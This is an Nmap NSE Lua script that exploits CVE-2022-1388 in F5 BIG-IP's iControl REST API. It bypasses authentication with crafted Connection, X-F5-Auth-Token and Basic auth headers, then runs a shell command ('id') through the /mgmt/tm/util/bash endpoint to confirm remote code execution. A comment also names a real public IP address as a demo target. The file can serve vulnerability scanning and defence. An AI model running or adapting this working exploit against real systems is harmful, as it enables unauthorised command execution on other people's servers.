author = {"Mr_Hackux", "Balgo Security"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive"}

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local json = require "json"
local io = require "io"
local os = require "os"
local base64 = require "base64"
local math = require "math"

---
-- @usage nmap -sV --script vuln <target>
-- @usage nmap -p443 --script http-vuln-cve2022-1388.nse <target>
-- targets démo
-- 103.40.139.131

portrule = shortport.http

local VULNERABLE = "commandResult"
action = function(host, port)

local uri = stdnse.get_script_args(SCRIPT_NAME .. ".uri") or "/mgmt/tm/util/bash"
 local opts = {header={}}
opts["header"]["Host"] = 'google.com'
opts["header"]["User-Agent"] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
--opts["header"]["Content-Type"] = 'application/json'
opts["header"]["Connection"] = 'keep-alive, x-F5-Auth-Token'
opts["header"]["X-F5-Auth-Token"] = 'a'
opts["header"]["Authorization"] = 'Basic YWRtaW46'

local cmd = "-c id"
local data = '{"command": "run", "utilCmdArgs":"'..cmd..'"}'

local req = http.post(host, port, uri, opts, nil, data)
stdnse.debug1("[+]"..req["status-line"])

local maTable = req.header
for k, v in pairs(maTable) do
stdnse.debug1(k, v)
end
stdnse.debug1("[+]"..req.body.."\n\n")

local vuln_table = {
title = "CVE 2022-1388 F5 Exploit ",
state = vulns.STATE.NOT_VULN,
risk_factor = "High",
description = [[
CVE 2022-1388 F5 BIG-IP iControl Rest API exposed Check
# Translated by: Google & ZephrFish
# Removed reverse shell option and merged into main function
]],
references = {
'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388',
'https://github.com/ZephrFish/F5-CVE-2022-1388-Exploit'
},
exploit_results = {}, 
} 

local cmd_shell = string.match(string.gsub(req.body, "\\([nt])",{n="\n", t="\t"}), '"commandResult":.-$')
stdnse.debug1(cmd_shell.."\n") 

if cmd_shell ~= nil then 
table.insert(vuln_table.exploit_results, "Commande: ".. cmd.."\nResults: "..cmd_shell.." \n") 
else cmd_shell = "***" 
end 


if req.status == 200 and string.find(req.body, VULNERABLE) ~= nil then
stdnse.debug1("[+] Target is Vulnerable\n\n")
vuln_table.state = vulns.STATE.VULN
else
stdnse.debug1("[-] Target Not Vulnerable\n\n")
end

local report = vulns.Report:new(SCRIPT_NAME, host, port)
return report:make_output(vuln_table)
end